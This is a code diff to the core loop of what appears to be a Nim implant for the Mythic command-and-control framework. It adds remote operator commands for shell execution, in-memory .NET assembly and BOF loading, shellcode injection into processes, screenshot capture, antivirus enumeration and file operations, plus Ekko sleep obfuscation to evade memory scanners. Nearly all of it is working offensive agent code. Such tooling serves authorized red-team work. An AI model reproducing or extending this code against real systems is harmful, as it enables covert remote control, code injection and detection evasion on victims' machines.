@@ -1,4 +1,4 @@
-import std/[json, random, os, base64, tables]
+import std/[json, random, os, base64, tables, strformat]
 import config
 import profiles/http_profile
 import utils/sysinfo
@@ -7,10 +7,32 @@ import tasks/sleep
 import tasks/ls
 import tasks/download
 import tasks/upload
+import tasks/execute_assembly
+import tasks/inline_execute
+import tasks/powerpick
+import tasks/run
+import tasks/shinject
+import tasks/whoami
+import tasks/cat
+import tasks/mkdir
+import tasks/cp
+import tasks/mv
+import tasks/cd
+import tasks/ps
+import tasks/pwd
+
+# Windows-only commands
+when defined(windows):
+  import tasks/screenshot
+  import tasks/get_av
+
+# Conditional imports for Windows-only features
+when defined(windows):
+  import utils/ekko
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -18,6 +40,8 @@ type
     fileId: string
     totalChunks: int
     currentChunk: int
+    fileData: seq[byte]  # For execute-assembly file accumulation
+    params: JsonNode  # Store original params for execute-assembly
   
   Agent* = ref object
     config: Config
@@ -72,13 +96,11 @@ proc buildCheckinMessage(): JsonNode =
     "architecture": sysInfo.arch,
     "domain": sysInfo.domain,
     "integrity_level": sysInfo.integrityLevel,
-    "external_ip": ""
+    "process_name": sysInfo.processName,
+    "cwd": sysInfo.cwd,
+    "impersonation_context": nil
   }
   
-  # NOTE: For HTTP profile, we do NOT include encryption_key/decryption_key in checkin
-  # Encryption config comes from the C2 profile settings in Mythic
-  # These fields are only used during RSA key exchange (staging_rsa action)
-
 proc checkin*(agent: Agent): bool =
   ## Perform initial checkin with Mythic
   if agent.config.debug:
@@ -124,7 +146,7 @@ proc getTasks*(agent: Agent): seq[JsonNode] =
   ## Get tasking from Mythic
   let getTaskingMsg = %*{
     "action": "get_tasking",
-    "tasking_size": 1
+    "tasking_size": -1
   }
   
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
@@ -259,6 +281,170 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         agent.backgroundTasks[taskId] = state
         continue
       
+      of "execute_assembly":
+        if agent.config.debug:
+          echo "[DEBUG] Starting execute-assembly (file download)"
+        response = executeAssembly(taskId, params)
+        agent.taskResponses.add(response)
+        
+        # Track as background task for file download
+        var state = BackgroundTaskState(
+          taskType: btExecuteAssembly,
+          path: "",
+          fileId: params["uuid"].getStr(),
+          totalChunks: 0,  # Will be set when we receive first chunk
+          currentChunk: 1,
+          fileData: @[],
+          params: params
+        )
+        agent.backgroundTasks[taskId] = state
+        continue
+      
+      of "inline_execute":
+        if agent.config.debug:
+          echo "[DEBUG] Starting inline_execute (BOF download)"
+        response = inlineExecute(taskId, params)
+        agent.taskResponses.add(response)
+        
+        # Track as background task for file download
+        var state = BackgroundTaskState(
+          taskType: btInlineExecute,
+          path: "",
+          fileId: params["uuid"].getStr(),
+          totalChunks: 0,  # Will be set when we receive first chunk
+          currentChunk: 1,
+          fileData: @[],
+          params: params
+        )
+        agent.backgroundTasks[taskId] = state
+        continue
+      
+      of "powerpick":
+        if agent.config.debug:
+          echo "[DEBUG] Executing powerpick command"
+        response = powerpick(taskId, params)
+        response["task_id"] = %taskId
+      
+      of "run":
+        if agent.config.debug:
+          echo "[DEBUG] Executing run command"
+        response = run(taskId, params)
+        response["task_id"] = %taskId
+      
+      of "shell":
+        if agent.config.debug:
+          echo "[DEBUG] Executing shell command (alias for run)"
+        response = run(taskId, params)
+        response["task_id"] = %taskId
+      
+      of "shinject":
+        if agent.config.debug:
+          echo "[DEBUG] Starting shinject (shellcode download)"
+        response = shinject(taskId, params)
+        agent.taskResponses.add(response)
+        
+        # Track as background task for file download
+        var state = BackgroundTaskState(
+          taskType: btShinject,
+          path: "",
+          fileId: params["uuid"].getStr(),
+          totalChunks: 0,
+          currentChunk: 1,
+          fileData: @[],
+          params: params
+        )
+        agent.backgroundTasks[taskId] = state
+        continue
+      
+      of "whoami":
+        if agent.config.debug:
+          echo "[DEBUG] Executing whoami command"
+        response = whoami(taskId, $params)
+      
+      of "cat":
+        if agent.config.debug:
+          echo "[DEBUG] Executing cat command"
+        response = catFile(taskId, $params)
+      
+      of "mkdir":
+        if agent.config.debug:
+          echo "[DEBUG] Executing mkdir command"
+        response = makeDirectory(taskId, $params)
+      
+      of "cp":
+        if agent.config.debug:
+          echo "[DEBUG] Executing cp command"
+        response = cpFile(taskId, $params)
+      
+      of "mv":
+        if agent.config.debug:
+          echo "[DEBUG] Executing mv command"
+        response = mvFile(taskId, $params)
+      
+      of "cd":
+        if agent.config.debug:
+          echo "[DEBUG] Executing cd command"
+        response = changeDirectory(taskId, $params)
+      
+      of "ps":
+        if agent.config.debug:
+          echo "[DEBUG] Executing ps command"
+        response = ps($params)
+        response["task_id"] = %taskId
+      
+      of "pwd":
+        if agent.config.debug:
+          echo "[DEBUG] Executing pwd command"
+        response = pwd(taskId, params)
+      
+      of "get_av":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing get_av command"
+          response = getAv(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "get_av command is only available on Windows"
+          }
+      
+      of "screenshot":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Starting screenshot capture"
+          response = screenshot(taskId, params)
+          if response.hasKey("download"):
+            # This is a background task - store screenshot data for chunking
+            agent.taskResponses.add(response)
+            
+            # Track as background task
+            let decodedStr = decode(response["screenshot_data"].getStr())
+            var dataBytes = newSeq[byte](decodedStr.len)
+            for i in 0..<decodedStr.len:
+              dataBytes[i] = decodedStr[i].byte
+            
+            var state = BackgroundTaskState(
+              taskType: btDownload,  # Reuse download for screenshots
+              path: "screenshot.bmp",
+              fileId: "",
+              totalChunks: response["download"]["total_chunks"].getInt(),
+              currentChunk: 0,
+              fileData: dataBytes
+            )
+            agent.backgroundTasks[taskId] = state
+            response.delete("screenshot_data")  # Don't send raw data to Mythic
+            continue
+        else:
+          # Windows-only command on non-Windows platform
+          response = %*{
+            "task_id": taskId,
+            "user_output": "screenshot command is only available on Windows",
+            "completed": true,
+            "status": "error"
+          }
+      
       else:
         # Command not implemented
         if agent.config.debug:
@@ -279,7 +465,10 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
         echo "[DEBUG] Task result status: ", response["status"].getStr()
       if response.hasKey("user_output"):
         let output = response["user_output"].getStr()
-        echo "[DEBUG] Task output length: ", output.len, " bytes"
+        if output.len < 200:
+          echo "[DEBUG] Task output: ", output
+        else:
+          echo "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
     
     agent.taskResponses.add(response)
 
@@ -328,21 +517,40 @@ proc postResponses*(agent: var Agent) =
               # Send next chunk
               if state.currentChunk < state.totalChunks:
                 state.currentChunk += 1
-                let chunkResp = processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
+                
+                # Differentiate between file download and screenshot (in-memory data)
+                let chunkResp = if state.fileData.len > 0:
+                  # Screenshot - process from memory (Windows only)
+                  when defined(windows):
+                    processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
+                  else:
+                    # Should never happen on non-Windows, but return error
+                    %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "Screenshot not supported"}
+                else:
+                  # File download - read from disk
+                  processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
+                
                 agent.taskResponses.add(chunkResp)
                 
                 # Check if this was the last chunk
                 if state.currentChunk >= state.totalChunks:
-                  let completeMsg = completeDownload(taskId, state.fileId, state.path)
+                  let completeMsg = if state.fileData.len > 0:
+                    # Screenshot complete (Windows only)
+                    when defined(windows):
+                      completeScreenshot(taskId, state.fileId)
+                    else:
+                      %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "Screenshot not supported"}
+                  else:
+                    # File download complete
+                    completeDownload(taskId, state.fileId, state.path)
+                  
                   agent.taskResponses.add(completeMsg)
                   agent.backgroundTasks.del(taskId)
                   if agent.config.debug:
-                    echo "[DEBUG] Download complete"
+                    let taskType = if state.fileData.len > 0: "Screenshot" else: "Download"
+                    echo "[DEBUG] ", taskType, " complete"
                 else:
                   agent.backgroundTasks[taskId] = state
-                
-                # Post immediately to send chunks
-                agent.postResponses()
             
             of btUpload:
               # Process incoming chunks
@@ -363,9 +571,72 @@ proc postResponses*(agent: var Agent) =
                 else:
                   state.currentChunk += 1
                   agent.backgroundTasks[taskId] = state
+            
+            of btExecuteAssembly:
+              # Process incoming file chunks for execute-assembly
+              if taskResp.hasKey("chunk_data"):
+                let chunkData = taskResp["chunk_data"].getStr()
+                let totalChunks = taskResp["total_chunks"].getInt()
+                state.totalChunks = totalChunks
                 
-                # Post immediately  
-                agent.postResponses()
+                # Process the chunk and get next request or final result
+                let execResp = processExecuteAssemblyChunk(
+                  taskId, state.params, chunkData, totalChunks, 
+                  state.currentChunk, state.fileData
+                )
+                agent.taskResponses.add(execResp)
+                
+                if execResp.hasKey("completed") and execResp["completed"].getBool():
+                  agent.backgroundTasks.del(taskId)
+                  if agent.config.debug:
+                    echo "[DEBUG] Execute-assembly complete"
+                else:
+                  state.currentChunk += 1
+                  agent.backgroundTasks[taskId] = state
+            
+            of btInlineExecute:
+              # Process incoming file chunks for inline_execute (BOF)
+              if taskResp.hasKey("chunk_data"):
+                let chunkData = taskResp["chunk_data"].getStr()
+                let totalChunks = taskResp["total_chunks"].getInt()
+                state.totalChunks = totalChunks
+                
+                # Process the chunk and get next request or final result
+                let bofResp = processInlineExecuteChunk(
+                  taskId, state.params, chunkData, totalChunks,
+                  state.currentChunk, state.fileData
+                )
+                agent.taskResponses.add(bofResp)
+                
+                if bofResp.hasKey("completed") and bofResp["completed"].getBool():
+                  agent.backgroundTasks.del(taskId)
+                  if agent.config.debug:
+                    echo "[DEBUG] Inline_execute complete"
+                else:
+                  state.currentChunk += 1
+                  agent.backgroundTasks[taskId] = state
+            
+            of btShinject:
+              # Process incoming file chunks for shinject
+              if taskResp.hasKey("chunk_data"):
+                let chunkData = taskResp["chunk_data"].getStr()
+                let totalChunks = taskResp["total_chunks"].getInt()
+                state.totalChunks = totalChunks
+                
+                # Process the chunk and get next request or final result
+                let injectResp = processShinjectChunk(
+                  taskId, state.params, chunkData, totalChunks,
+                  state.currentChunk, state.fileData
+                )
+                agent.taskResponses.add(injectResp)
+                
+                if injectResp.hasKey("completed") and injectResp["completed"].getBool():
+                  agent.backgroundTasks.del(taskId)
+                  if agent.config.debug:
+                    echo "[DEBUG] Shinject complete"
+                else:
+                  state.currentChunk += 1
+                  agent.backgroundTasks[taskId] = state
     except:
       if agent.config.debug:
         echo "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
@@ -394,6 +665,17 @@ proc sleep*(agent: Agent) =
     echo "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
          "s, jitter: ", agent.jitter, "%)"
   
-  os.sleep(sleepTime * 1000)
+  # Use Ekko sleep obfuscation if enabled (only for sleeps >= 3 seconds)
+  when defined(windows):
+    if agent.config.sleepObfuscation == "ekko" and sleepTime >= 3:
+      if agent.config.debug:
+        echo "[DEBUG] Using Ekko sleep obfuscation"
+      ekkoObf(sleepTime * 1000)
+    else:
+      if agent.config.debug and agent.config.sleepObfuscation == "ekko" and sleepTime < 3:
+        echo "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
+      os.sleep(sleepTime * 1000)
+  else:
+    os.sleep(sleepTime * 1000)
 
 
